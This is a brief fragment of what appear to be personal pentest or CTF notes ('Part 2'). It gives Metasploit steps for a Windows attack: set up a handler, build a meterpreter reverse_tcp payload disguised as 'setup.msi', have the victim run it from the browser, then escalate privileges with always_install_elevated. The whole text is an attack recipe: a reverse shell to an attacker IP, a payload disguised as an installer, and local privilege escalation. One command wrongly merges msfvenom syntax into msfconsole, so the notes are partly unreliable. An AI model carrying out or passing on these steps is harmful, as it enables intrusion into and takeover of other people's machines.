Part 2

same in msfconsole 
1) use exploit/multi/handler/
2) set payload msfvenom -p windows/meterpreter/reverse_tcp lhost=IP -f msi  -o setup.msi  
3) run


**go to windows machine locate the file on browser and just run the file no need to save only run**


**IF the shell is low level user and we have a meterpreter session open use 
exploit/local/windows/always_install_elevated set session and run**
